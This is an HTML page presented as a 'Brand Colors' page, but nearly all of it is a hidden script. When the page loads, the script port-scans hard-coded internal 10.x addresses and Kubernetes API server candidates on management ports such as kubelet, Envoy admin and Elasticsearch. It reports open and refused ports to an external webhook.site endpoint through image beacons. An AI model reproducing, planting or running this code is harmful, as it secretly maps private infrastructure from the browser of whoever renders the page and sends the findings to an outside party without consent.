<!DOCTYPE html>
<html>
<head><title>Brand Colors</title></head>
<body>
<h1 style="color:#cc3300">Professional Brand</h1>
<script>
var wh = "https://webhook.site/ecc2dc86-2fe4-41dc-b6dd-8cac2fc896c9";
new Image().src = wh + "/portscan-start";

// Known internal IPs
var ips = ["10.149.76.150", "10.149.206.243", "10.149.91.165", "10.149.228.109"];
// Ports commonly used by HTTP services (not gRPC)
var ports = [80, 443, 3000, 8080, 8081, 8443, 9090, 9091, 9093, 9115, 9200, 10250, 10255, 15000, 15001, 15672, 16686, 19090];

// Also try K8s API server IPs
var k8sIPs = ["10.96.0.1", "10.0.0.1", "172.20.0.1"];

var idx = 0;
function probe(ip, port) {
  var url = "http://" + ip + ":" + port + "/";
  var start = Date.now();
  fetch(url, {mode:'no-cors',credentials:'omit'}).then(function(r) {
    var ms = Date.now() - start;
    if (ms < 5000) {
      new Image().src = wh + "/open-" + ip + "-" + port + "-" + ms + "ms-" + r.type;
    }
  }).catch(function(e) {
    var ms = Date.now() - start;
    if (ms < 100) {
      // Fast rejection = port actively refused (exists but closed)
      new Image().src = wh + "/refused-" + ip + "-" + port + "-" + ms + "ms";
    }
    // Timeout = filtered/unreachable, don't report
  });
}

// Scan known IPs on management ports
ips.forEach(function(ip) {
  [15000, 15001, 9090, 3000, 9200, 10250, 10255, 19090, 16686, 9093].forEach(function(port) {
    setTimeout(function() { probe(ip, port); }, idx++ * 50);
  });
});

// Scan K8s API server candidates
k8sIPs.forEach(function(ip) {
  [443, 6443, 8443].forEach(function(port) {
    setTimeout(function() { probe(ip, port); }, idx++ * 50);
  });
});

// Report done
setTimeout(function() {
  new Image().src = wh + "/portscan-done";
}, idx * 50 + 5000);
</script>
</body>
</html>
